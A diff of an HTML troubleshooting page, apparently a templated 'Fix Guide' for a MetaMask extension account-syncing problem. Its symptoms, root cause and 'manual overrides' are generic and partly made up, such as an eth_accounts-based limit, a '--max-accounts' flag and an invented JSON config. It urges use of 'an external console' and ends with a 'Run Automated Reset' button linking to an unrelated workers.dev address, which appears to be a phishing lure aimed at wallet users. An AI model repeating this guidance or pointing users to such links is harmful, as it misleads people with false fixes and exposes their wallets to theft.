@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #1a1a24;
+        font-family: system-ui;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
-        background: #cf6679;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,34 @@
 <h1>Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users are experiencing issues with the Metamask extension, specifically with the creation and syncing of multichain accounts, resulting in a span fan-out error.</li>
+<li>Users experience excessive account creation and syncing issues with Metamask extension on the Ethereum (ETH) ecosystem, resulting in a significant increase in span fan-out.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an uncontrolled growth in the number of accounts being created and synced across multiple chains, causing a fan-out effect that overwhelms the system.</li>
+<li>The error occurs due to uncontrolled multichain account creation and syncing, causing the system to overload and timeout.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To mitigate this issue, the following manual overrides can be applied:</li>
-<li>Limit the number of accounts being created and synced concurrently</li>
-<li>Implement a rate limiter to control the frequency of account creation and syncing requests</li>
-<li>Configure the Metamask extension to prioritize account syncing based on user activity</li>
+<li>Set a limit on the number of accounts that can be created and synced simultaneously: </li>
+<li>Configure account creation limits using <code>eth_accounts</code> API</li>
+<li>Implement a queue system to manage account syncing requests</li>
+<li>Monitor and adjust the <code>--max-accounts</code> flag</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;accountCreationLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;syncRateLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;prioritySync&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
+<span class="w">  </span><span class="nt">&quot;syncingQueueSize&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">50</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;maxAccounts&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and configuration.</p>
+<p>Consider utilizing an external console for more advanced debugging and configuration options.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension version 10.2.1 or later</li>
-<li>Ethereum chain ID configured correctly</li>
-<li>User account properly set up and connected to the extension</li>
+<li>Metamask extension installed and configured</li>
+<li>Ethereum (ETH) ecosystem setup and running</li>
+<li>Basic understanding of JSON configuration files and command-line interfaces</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-networks-no-feedback-after-selecting-a-n.html">Metamask Extension Bug Networks No Feedback After Selecting A Network</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li><li><a href="./archive/2026/06/java-tron-tron-ethcall-returns-cpu-timeout-for-contract-view-fu.html">Java Tron Tron Ethcall Returns Cpu Timeout For Contract View Fu</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
